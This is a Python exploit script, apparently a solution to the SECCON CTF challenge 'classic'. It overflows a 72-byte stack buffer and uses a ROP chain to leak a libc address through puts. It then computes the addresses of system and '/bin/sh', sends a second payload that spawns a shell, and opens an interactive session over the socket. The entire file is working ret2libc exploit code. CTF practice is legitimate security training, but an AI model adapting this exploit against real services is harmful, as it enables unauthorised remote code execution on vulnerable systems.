import sys
import socket
import time
import telnetlib
from haclib import *


bufsize = 72
pop_rdi_ret = 0x00400753
popret = 0x00400753
pop2ret = 0x00400751
pop3ret = 0x0040074e
main_addr = 0x004006a9
libc_start_main_got =  0x00601030
puts_plt = 0x00400520

def main():
    buf = b'A' * bufsize
    buf += p64(popret) 
    buf += p64(libc_start_main_got) 
    buf += p64(puts_plt)
    buf += p64(main_addr)
    buf += b'\n'

#    sys.stdout.buffer.write(buf)
#    sys.exit()

    if(len(sys.argv) > 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("classic.pwn.seccon.jp", 17354))
        libc_start_main_rel = 0x20740
        system_rel = 0x45390
        binsh_rel = 0x18cd57 
        puts_rel = 0x6f690
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("localhost", 28080))
#    sock.connect(("classic.pwn.seccon.jp", 17354))
        libc_start_main_rel = 0x00021ab0
        system_rel = 0x0004f440
        binsh_rel =  0x001b3e9a
        puts_rel = 0x000809c0

    time.sleep(1)
    read_until(sock, b"Local Buffer >> ")
    print("Local Buffer >> ")
    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)

    read_until(sock, b"Have a nice pwn!!\n")
    print("Have a nice pwn!!\n")
    time.sleep(1)

    val = sock.recv(6)
    print(val)
    print(len(val))
    val = val + b'\x00\x00'

    libc_start_main_addr = u64(val)
    print("%x" % (libc_start_main_addr))
    libc_base = libc_start_main_addr - libc_start_main_rel
    print("%x" % (libc_base))
    system_addr = libc_base + system_rel
    binsh_addr = libc_base + binsh_rel
    puts_addr = libc_base + puts_rel

    time.sleep(1);

    buf = b'A' * bufsize
    buf += p64(popret)
    buf += p64(binsh_addr)
#    buf += p64(puts_addr)
    buf += p64(system_addr)
#    buf += p64(0x00000000)
    buf += b'BBBBBBBB'
    buf += b'\n'

    time.sleep(1)
    read_until(sock, b"Local Buffer >> ")
    print("Local Buffer >> ")

    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)
    read_until(sock, b"Have a nice pwn!!\n")
    print("Have a nice pwn!!\n")

#    time.sleep(1)
#    sock.send(b"cat flag.txt")
#    time.sleep(1)
    
#    s = sock.recv(100)
#    while len(s) > 0:
#        print(s)
#        s = sock.recv(100)

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
